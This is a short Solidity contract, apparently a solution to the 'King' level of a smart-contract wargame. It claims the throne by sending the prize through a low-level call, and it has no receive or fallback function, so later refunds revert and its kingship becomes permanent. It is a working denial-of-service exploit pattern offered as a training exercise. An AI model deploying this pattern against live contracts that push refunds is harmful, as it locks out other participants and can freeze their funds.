// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {King} from "./King.sol";

contract ForeverKing {
    King king;

    constructor(King _king) payable {
        king = _king;
    }

    function makeMeKing() external payable {
        (bool sent, ) = address(king).call{value: king.prize()}("");
    }

}